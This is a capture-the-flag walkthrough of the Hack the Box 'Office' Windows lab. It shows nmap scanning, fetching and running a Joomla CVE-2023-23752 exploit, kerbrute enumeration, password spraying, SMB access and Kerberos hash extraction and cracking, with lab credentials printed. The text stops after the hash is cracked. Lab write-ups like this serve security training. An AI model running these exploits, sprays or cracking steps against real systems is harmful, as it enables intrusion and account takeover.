---
title: "Hack the Box - Office"
slug: "hack-the-box-office"
date: "2024-03-14"
excerpt: "Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the `MacroSecurityLevel` registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges."
cover: "cover.png"
tags:
  - PCAP
  - Macros
  - DPAPI
  - GPO
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -T4 -v -oN scans/nmap.txt 10.10.11.3
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Home
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-24 09:25:00Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-24T09:26:22+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| http-methods: 
|_  Supported Methods: POST
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: 2024-05-24T09:26:21+00:00; +8h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-24T09:26:22+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-24T09:26:21+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Joomla

Website on port `80`.

![](evidence/screenshots/2024-05-24-11-55-46.png)

Results from `nmap` scan show us there's a `robots.txt` file. 

![](evidence/screenshots/2024-05-24-12-02-04.png)

We can access the `/administrator` directory which gives us a Joomla login portal.

![](evidence/screenshots/2024-05-24-12-03-23.png)

If we look around the directories of the website we find `cassiopeia`. With a bit of Googling we can find an [exploit](https://www.exploit-db.com/exploits/51334).

![](evidence/screenshots/2024-05-24-12-01-24.png)

### CVE 2023-23752

```bash
wget https://www.exploit-db.com/raw/51334 -O exploit.rb
sudo gem install httpx docopt paint
ruby exploit.rb
```

![](evidence/screenshots/2024-05-24-12-17-35.png)

We get credentials:

```text
root:H0lOgrams4reTakIng0Ver754!
```

### Kerbrute

Let's enumerate users on the domain.

```bash
kerbrute userenum --dc dc.office.htb -d office.htb -v -t 150 /usr/share/wordlists/statistically-likely-usernames/jsmith.txt | tee kerbrute.out
```

![](evidence/screenshots/2024-05-24-12-23-58.png)

```bash
cat kerbrute.out | grep + | awk '{print $7}' | cut -d '@' -f 1 | tee users.txt
```

![](evidence/screenshots/2024-05-24-12-24-58.png)

We can use `crackmapexec` and spray the password we found against all the users enumerated.

```bash
crackmapexec smb office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --shares
```

![](evidence/screenshots/2024-05-24-12-31-31.png)

```text
dwolfe:H0lOgrams4reTakIng0Ver754!
```

### SMB

```bash
smbclient '//office.htb/SOC Analysis' -U 'OFFICE\dwolfe%H0lOgrams4reTakIng0Ver754!'
```

![](evidence/screenshots/2024-05-24-12-35-23.png)

We find a `.pcap` file. Let's exfiltrate it and open it up in `Wireshark`.

After looking around and using a few filters, we find some Kerberos authentication action.

![](evidence/screenshots/2024-05-24-12-46-29.png)

After doing some [research](https://notes.benheater.com/books/active-directory/page/extracting-kerberos-as-req-pre-auth-hashes-from-pcaps), found a tool we can use to get the hashes from the `.pcap` file.

```bash
sudo apt install -y mono-devel
wget https://www.netresec.com/?download=NetworkMiner -O ./nm.zip
unzip nm.zip
mono NetworkMiner_2-8-1/NetworkMiner.exe --noupdatecheck
```

NetworkMiner doesn't allow us to use `.pcapng` files on the free version so we can convert `.pcapng` to `.pcap` using `thark`.

```bash
tshark -F pcap -r Latest-System-Dump-8fbc124d.pcap -w output.pcap
```

If we look at the `Credential` tab, there's the ticket we found in `Wireshark` previously. You can use the `19900` mode for `hashcat`. 

![](evidence/screenshots/2024-05-24-13-22-04.png)

```text
tshark:$krb5pa$18$tstark$OFFICE.HTB$$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

We can use `jtr` to crack the pre-auth ticket.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt krb5.hash 
```

![](evidence/screenshots/2024-05-24-13-27-35.png)

```text
tshark:playboy69
```

